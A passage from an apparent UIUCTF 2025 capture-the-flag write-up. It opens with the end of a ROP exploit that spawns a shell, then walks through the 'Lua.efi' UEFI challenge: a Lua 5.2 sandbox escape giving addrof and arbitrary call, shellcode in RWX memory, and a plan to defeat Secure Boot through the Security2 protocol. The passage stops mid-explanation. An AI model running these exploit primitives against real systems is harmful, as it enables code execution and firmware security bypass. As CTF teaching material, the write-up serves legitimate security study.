</span></span><span class="line"><span class="cl"><span class="n">poprax</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x6001</span> <span class="c1"># pop rax; ret;</span>
</span></span><span class="line"><span class="cl"><span class="n">xorrdx</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x185be</span> <span class="c1"># xor edx, edx; mov rax, rdx; ret;</span>
</span></span><span class="line"><span class="cl"><span class="n">syscall</span> <span class="o">=</span> <span class="n">ld_base</span> <span class="o">+</span> <span class="mh">0x4370f</span> <span class="c1"># syscall; ret;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">poprdi</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10088</span><span class="p">,</span> <span class="c1"># /bin/sh </span>
</span></span><span class="line"><span class="cl">    <span class="n">poprsi</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10f88</span><span class="p">,</span> <span class="c1"># sh </span>
</span></span><span class="line"><span class="cl">    <span class="n">xorrdx</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">poprax</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x3b</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">syscall</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div></div>
<h1 id="luaefi">Lua.efi</h1>
<table>
  <thead>
      <tr>
          <th></th>
          <th></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><strong>CTF</strong></td>
          <td><a href="https://2025.uiuc.tf/" target="_blank" rel="noopener noreffer ">UIUCTF</a> <a href="https://ctftime.org/event/2640" target="_blank" rel="noopener noreffer ">(CTFtime)</a></td>
      </tr>
      <tr>
          <td><strong>Author</strong></td>
          <td>YiFei Zhu</td>
      </tr>
      <tr>
          <td><strong>Category</strong></td>
          <td>Pwn</td>
      </tr>
      <tr>
          <td><strong>Solves</strong></td>
          <td>12</td>
      </tr>
  </tbody>
</table>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/luaefi.png"
        data-srcset="/posts/uiuctf_2025/images/luaefi.png, /posts/uiuctf_2025/images/luaefi.png 1.5x, /posts/uiuctf_2025/images/luaefi.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/luaefi.png"
        title="img" width="425" height="636" /></p>
<h2 id="challenge-analysis-2">Challenge Analysis</h2>
<p>We can download the handout and see that it contains several files:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/luahandout.png"
        data-srcset="/posts/uiuctf_2025/images/luahandout.png, /posts/uiuctf_2025/images/luahandout.png 1.5x, /posts/uiuctf_2025/images/luahandout.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/luahandout.png"
        title="img" width="1222" height="570" /></p>
<p>In the <code>README</code> file, we can find a description of each directory. The <code>edk2_artifacts</code> directory contains all the artifacts with debug symbols. The <code>chal_build</code> directory isn&rsquo;t particularly important, except for a few files. The <code>run</code> directory holds all the necessary files to run the challenge.</p>
<p>The <code>run.sh</code> script contains:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sh">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#! /bin/sh
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl">cp OVMF_VARS.fd OVMF_VARS_copy.fd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Note: rootfs is read-only on remote</span>
</span></span><span class="line"><span class="cl">rm -rf rootfs_copy<span class="p">;</span> cp -r rootfs rootfs_copy
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">qemu-system-x86_64 <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -no-reboot <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -machine q35,smm<span class="o">=</span>on <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -cpu max <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -m <span class="m">256</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -net none <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -serial stdio <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -display none <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -monitor none <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -vga none <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -global ICH9-LPC.disable_s3<span class="o">=</span><span class="m">1</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -global <span class="nv">driver</span><span class="o">=</span>cfi.pflash01,property<span class="o">=</span>secure,value<span class="o">=</span>on <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -fw_cfg <span class="nv">name</span><span class="o">=</span>opt/org.tianocore/FirmwareSetupSupport,string<span class="o">=</span>no <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -fw_cfg <span class="nv">name</span><span class="o">=</span>opt/org.tianocore/EFIShellSupport,string<span class="o">=</span>no <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -fw_cfg <span class="nv">name</span><span class="o">=</span>opt/org.tianocore/EnableLegacyLoader,string<span class="o">=</span>no <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -drive <span class="k">if</span><span class="o">=</span>pflash,format<span class="o">=</span>raw,unit<span class="o">=</span>0,file<span class="o">=</span>OVMF_CODE.fd,readonly<span class="o">=</span>on <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -drive <span class="k">if</span><span class="o">=</span>pflash,format<span class="o">=</span>raw,unit<span class="o">=</span>1,file<span class="o">=</span>OVMF_VARS_copy.fd <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -drive <span class="nv">format</span><span class="o">=</span>raw,file<span class="o">=</span>fat:rw:rootfs_copy <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -virtfs local,multidevs<span class="o">=</span>remap,path<span class="o">=</span>secret,security_model<span class="o">=</span>none,mount_tag<span class="o">=</span>flag,readonly<span class="o">=</span>on</span></span></code></pre></div></div>
<p>The <code>init</code> file contains the following:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sh">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1"># Copyright 2021-2025 Google LLC.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># SPDX-License-Identifier: MIT</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">set</span> -x
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mkdir -p /proc /dev /sys /etc /mnt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mount -n -t proc -o nosuid,noexec,nodev proc /proc/
</span></span><span class="line"><span class="cl">mount -n -t devtmpfs -o <span class="nv">mode</span><span class="o">=</span>0755,nosuid,noexec devtmpfs /dev
</span></span><span class="line"><span class="cl">mount -n -t sysfs -o nosuid,noexec,nodev sys /sys
</span></span><span class="line"><span class="cl">mount -n -t tmpfs -o <span class="nv">mode</span><span class="o">=</span><span class="m">1777</span> tmpfs /tmp
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mount -n -t 9p flag -o nosuid,noexec,nodev,version<span class="o">=</span>9p2000.L,trans<span class="o">=</span>virtio,msize<span class="o">=</span><span class="m">104857600</span> /mnt
</span></span><span class="line"><span class="cl">cat /mnt/flag
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">sleep <span class="m">10</span>
</span></span><span class="line"><span class="cl">poweroff -f</span></span></code></pre></div></div>
<p>It mounts the flag and prints it during boot. The challenge description mentions booting a backdoored kernel, so the goal is to boot that kernel—which should print the flag.</p>
<p>When we run the challenge, we see the following menu:
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/menu.png"
        data-srcset="/posts/uiuctf_2025/images/menu.png, /posts/uiuctf_2025/images/menu.png 1.5x, /posts/uiuctf_2025/images/menu.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/menu.png"
        title="img" width="714" height="262" /></p>
<p>However, when we try to boot the Linux container, we get this error:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/backdoorboot.png"
        data-srcset="/posts/uiuctf_2025/images/backdoorboot.png, /posts/uiuctf_2025/images/backdoorboot.png 1.5x, /posts/uiuctf_2025/images/backdoorboot.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/backdoorboot.png"
        title="img" width="1273" height="113" /></p>
<p>This indicates that the kernel we want to boot is blocked by Secure Boot.</p>
<p>A few patches have been applied. The patches inside the <code>edk2</code> directory add ASLR support, since UEFI doesn’t have ASLR by default. There’s also a Lua interpreter included, but the internal functions to open, read, write files, and execute commands have been removed—most likely to prevent unintended solutions.</p>
<p>From the start of the CTF, we received a hint for this challenge:</p>
<blockquote>
<p>Feel free to use known exploits that exist in the wild to escape the lua &ldquo;jail&rdquo;, such as <a href="https://gist.github.com/corsix/49d770c7085e4b75f32939c6c076aad6" target="_blank" rel="noopener noreffer ">https://gist.github.com/corsix/49d770c7085e4b75f32939c6c076aad6</a></p></blockquote>
<p>This exploit targets the Lua 5.2 interpreter, which we can use to escape the Lua jail.</p>
<h2 id="setup-2">Setup</h2>
<p>For this challenge, I modified the run script to include the <code>-s</code> option so that I could connect with GDB. I also added two lines to dump logs during system boot:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sh">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">  -debugcon file:edk2debug.log <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -global isa-debugcon.iobase<span class="o">=</span>0x402 <span class="err">\</span></span></span></code></pre></div></div>
<p>Inside the log, we can find the entry points and base addresses of the different EFI modules. For example:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>FSOpen: Open &#39;\Lua.efi&#39; Success
[Security] 3rd party image[0] can be loaded after EndOfDxe: PciRoot(0x0)/Pci(0x1F,0x2)/Sata(0x0,0xFFFF,0x0)/HD(1,MBR,0xBE1AFDFA,0x3F,0xFBFC1)/\Lua.efi.
DxeImageVerification: MeasureVariable (Pcr - 7, EventType - 800000E0, VariableName - db, VendorGuid - D719B2CB-3D3A-4596-A3BC-DAD00E67656F)
MeasureBootPolicyVariable - Not Found
None of Tcg2Protocol/CcMeasurementProtocol is installed.
InstallProtocolInterface: 5B1B31A1-9562-11D2-8E3F-00A0C969723B D12B240
Loading driver at 0x0000D082000 EntryPoint=0x0000D084165 Lua.efi
InstallProtocolInterface: BC62157E-3E33-4FEC-9920-2D3B36D750DF D12EB18
ProtectUefiImageCommon - 0xD12B240
  - 0x000000000D082000 - 0x0000000000044C00
DXE StartImage - 0x0000D084165</code></pre></div>
<p>We can then create a GDB script and use it to relocate the EFI module using the debug file:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>target remote :1234
add-symbol-file ../edk2_artifacts/Lua.debug -o 0x0000D082000
c</code></pre></div>
<h2 id="exploitation-2">Exploitation</h2>
<p>This was my first UEFI challenge, so I spent a lot of time reading EDK2 code. The goal was to disable Secure Boot. Initially, I tried doing everything from Lua, including creating arbitrary read/write functions. At some point, I started thinking about executing shellcode. I used the exploit provided in the hint, but had to remove a few local keywords to avoid errors.</p>
<p>I created a string and printed its address. When checking the memory permissions, I noticed that it lived in an RWX page—meaning I could place shellcode there and execute it using the Lua exploit. The Lua jail escape gave me both an addrof primitive and an arbitrary function call to any address.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-lua">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-lua" data-lang="lua"><span class="line"><span class="cl"><span class="n">as_num</span> <span class="o">=</span> <span class="n">string.dump</span><span class="p">(</span><span class="kr">function</span><span class="p">(...)</span> <span class="kr">for</span> <span class="n">n</span> <span class="o">=</span> <span class="p">...,</span> <span class="p">...,</span> <span class="mi">0</span> <span class="kr">do</span> <span class="kr">return</span> <span class="n">n</span> <span class="kr">end</span> <span class="kr">end</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">as_num</span> <span class="o">=</span> <span class="n">as_num</span><span class="p">:</span><span class="n">gsub</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x21</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\x17</span><span class="s2">&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">as_num</span> <span class="o">=</span> <span class="n">assert</span><span class="p">(</span><span class="n">load</span><span class="p">(</span><span class="n">as_num</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">function</span> <span class="nf">addr_of</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="kr">return</span> <span class="n">as_num</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="o">^</span><span class="mi">1000</span> <span class="o">*</span> <span class="mi">2</span><span class="o">^</span><span class="mi">74</span> <span class="kr">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">function</span> <span class="nf">ub8</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="kd">local</span> <span class="n">t</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">  <span class="kr">for</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">8</span> <span class="kr">do</span>
</span></span><span class="line"><span class="cl">    <span class="kd">local</span> <span class="n">b</span> <span class="o">=</span> <span class="n">n</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">    <span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">string.char</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span> <span class="p">(</span><span class="n">n</span> <span class="o">-</span> <span class="n">b</span><span class="p">)</span> <span class="o">/</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">  <span class="kr">end</span>
</span></span><span class="line"><span class="cl">  <span class="kr">return</span> <span class="n">table.concat</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">upval_assign</span> <span class="o">=</span> <span class="n">string.dump</span><span class="p">(</span><span class="kr">function</span><span class="p">(...)</span>
</span></span><span class="line"><span class="cl">  <span class="kd">local</span> <span class="n">magic</span>
</span></span><span class="line"><span class="cl">  <span class="p">(</span><span class="kr">function</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kr">function</span><span class="p">(</span><span class="n">func</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">magic</span> <span class="o">=</span> <span class="n">func</span>
</span></span><span class="line"><span class="cl">    <span class="kr">end</span><span class="p">)(</span><span class="n">func</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">magic</span> <span class="o">=</span> <span class="n">x</span>
</span></span><span class="line"><span class="cl">  <span class="kr">end</span><span class="p">)(...)</span>
</span></span><span class="line"><span class="cl"><span class="kr">end</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">upval_assign</span> <span class="o">=</span> <span class="n">upval_assign</span><span class="p">:</span><span class="n">gsub</span><span class="p">(</span><span class="s2">&#34;(magic</span><span class="se">\x00\x01\x00\x00\x00\x01</span><span class="s2">)</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;%1</span><span class="se">\x01</span><span class="s2">&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">upval_assign</span> <span class="o">=</span> <span class="n">assert</span><span class="p">(</span><span class="n">load</span><span class="p">(</span><span class="n">upval_assign</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">function</span> <span class="nf">make_CClosure</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">up</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="kd">local</span> <span class="n">co</span> <span class="o">=</span> <span class="n">coroutine.wrap</span><span class="p">(</span><span class="kr">function</span><span class="p">()</span><span class="kr">end</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">local</span> <span class="n">offsetof_CClosure_f</span> <span class="o">=</span> <span class="mi">24</span>
</span></span><span class="line"><span class="cl">  <span class="kd">local</span> <span class="n">offsetof_CClosure_upvalue0</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="cl">  <span class="kd">local</span> <span class="n">sizeof_TString</span> <span class="o">=</span> <span class="mi">24</span>
</span></span><span class="line"><span class="cl">  <span class="kd">local</span> <span class="n">offsetof_UpVal_v</span> <span class="o">=</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl">  <span class="kd">local</span> <span class="n">offsetof_Proto_k</span> <span class="o">=</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl">  <span class="kd">local</span> <span class="n">offsetof_LClosure_proto</span> <span class="o">=</span> <span class="mi">24</span>
</span></span><span class="line"><span class="cl">  <span class="kd">local</span> <span class="n">upval1</span> <span class="o">=</span> <span class="n">ub8</span><span class="p">(</span><span class="n">addr_of</span><span class="p">(</span><span class="n">co</span><span class="p">)</span> <span class="o">+</span> <span class="n">offsetof_CClosure_f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="kd">local</span> <span class="n">func1</span> <span class="o">=</span> <span class="n">ub8</span><span class="p">(</span><span class="n">addr_of</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s2">&#34;</span><span class="p">)</span> <span class="o">-</span> <span class="n">offsetof_Proto_k</span><span class="p">)</span> <span class="o">..</span> <span class="n">ub8</span><span class="p">(</span><span class="n">addr_of</span><span class="p">(</span><span class="n">upval1</span><span class="p">)</span> <span class="o">+</span> <span class="n">sizeof_TString</span> <span class="o">-</span> <span class="n">offsetof_UpVal_v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="kd">local</span> <span class="n">upval2</span> <span class="o">=</span> <span class="n">ub8</span><span class="p">(</span><span class="n">addr_of</span><span class="p">(</span><span class="n">co</span><span class="p">)</span> <span class="o">+</span> <span class="n">offsetof_CClosure_upvalue0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="kd">local</span> <span class="n">func2</span> <span class="o">=</span> <span class="n">func1</span><span class="p">:</span><span class="n">sub</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="o">..</span> <span class="n">ub8</span><span class="p">(</span><span class="n">addr_of</span><span class="p">(</span><span class="n">upval2</span><span class="p">)</span> <span class="o">+</span> <span class="n">sizeof_TString</span> <span class="o">-</span> <span class="n">offsetof_UpVal_v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="n">upval_assign</span><span class="p">((</span><span class="n">addr_of</span><span class="p">(</span><span class="n">func1</span><span class="p">)</span> <span class="o">+</span> <span class="n">sizeof_TString</span> <span class="o">-</span> <span class="n">offsetof_LClosure_proto</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="o">^-</span><span class="mi">1000</span> <span class="o">*</span> <span class="mi">2</span><span class="o">^-</span><span class="mi">74</span><span class="p">,</span> <span class="n">f</span> <span class="o">*</span> <span class="mi">2</span><span class="o">^-</span><span class="mi">1000</span> <span class="o">*</span> <span class="mi">2</span><span class="o">^-</span><span class="mi">74</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="n">upval_assign</span><span class="p">((</span><span class="n">addr_of</span><span class="p">(</span><span class="n">func2</span><span class="p">)</span> <span class="o">+</span> <span class="n">sizeof_TString</span> <span class="o">-</span> <span class="n">offsetof_LClosure_proto</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="o">^-</span><span class="mi">1000</span> <span class="o">*</span> <span class="mi">2</span><span class="o">^-</span><span class="mi">74</span><span class="p">,</span> <span class="n">up</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="kr">return</span> <span class="n">co</span>
</span></span><span class="line"><span class="cl"><span class="kr">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="s2">&#34;AAAAAAAA&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="o">=</span> <span class="n">addr_of</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">print</span><span class="p">(</span><span class="n">string.format</span><span class="p">(</span><span class="s2">&#34;0x%X&#34;</span><span class="p">,</span> <span class="n">addr</span><span class="p">))</span></span></span></code></pre></div></div>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/addrof.png"
        data-srcset="/posts/uiuctf_2025/images/addrof.png, /posts/uiuctf_2025/images/addrof.png 1.5x, /posts/uiuctf_2025/images/addrof.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/addrof.png"
        title="img" width="553" height="70" />
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/rwx.png"
        data-srcset="/posts/uiuctf_2025/images/rwx.png, /posts/uiuctf_2025/images/rwx.png 1.5x, /posts/uiuctf_2025/images/rwx.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/rwx.png"
        title="img" width="1813" height="175" /></p>
<p>If we check whether the data is at that location, we can see that it is located 0x18 bytes after the leaked address.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/luastring.png"
        data-srcset="/posts/uiuctf_2025/images/luastring.png, /posts/uiuctf_2025/images/luastring.png 1.5x, /posts/uiuctf_2025/images/luastring.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/luastring.png"
        title="img" width="855" height="396" /></p>
<p>We can now execute it by calling the closure function on the leaked address.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-lua">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-lua" data-lang="lua"><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">make_CClosure</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="p">()</span></span></span></code></pre></div></div>
<p>Now, how do we disable Secure Boot? Since we have arbitrary code execution and can manipulate memory freely, there are several ways to do this. When an image is loaded using <a href="https://uefi.org/specs/UEFI/2.9_A/07_Services_Boot_Services.html#efi-boot-services-loadimage" target="_blank" rel="noopener noreffer "><code>LoadImage</code></a>, it internally calls the <a href="https://github.com/tianocore/edk2/blob/master/MdeModulePkg/Core/Dxe/Image/Image.c#L1271" target="_blank" rel="noopener noreffer "><code>FileAuthentication</code></a> function from the Security2 protocol. The <code>_EFI_SECURITY2_ARCH_PROTOCOL</code> structure is defined as <a href="https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Protocol/Security2.h#L95C8-L95C36" target="_blank" rel="noopener noreffer ">this</a></p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-c">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">///
</span></span></span><span class="line"><span class="cl"><span class="c1">/// The EFI_SECURITY2_ARCH_PROTOCOL is used to abstract platform-specific policy from the
</span></span></span><span class="line"><span class="cl"><span class="c1">/// DXE Foundation. This includes measuring the PE/COFF image prior to invoking, comparing the
</span></span></span><span class="line"><span class="cl"><span class="c1">/// image against a policy (whether a white-list/black-list of public image verification keys
</span></span></span><span class="line"><span class="cl"><span class="c1">/// or registered hashes).
</span></span></span><span class="line"><span class="cl"><span class="c1">///
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">struct</span> <span class="n">_EFI_SECURITY2_ARCH_PROTOCOL</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">EFI_SECURITY2_FILE_AUTHENTICATION</span>    <span class="n">FileAuthentication</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></div></div>
<p>Every UEFI protocol has a globally unique identifier called a GUID. There is also a function named <code>LocateProtocol</code>, defined as <a href="https://uefi.org/specs/UEFI/2.9_A/07_Services_Boot_Services.html#efi-boot-services-locateprotocol" target="_blank" rel="noopener noreffer "><code>EFI_BOOT_SERVICES.LocateProtocol()</code></a>.</p>
<p>The <code>LocateProtocol()</code> function searches for the first device handle that supports a given protocol and returns a pointer to the protocol interface in the Interface parameter. If no instance of the protocol is found, Interface is set to NULL.</p>
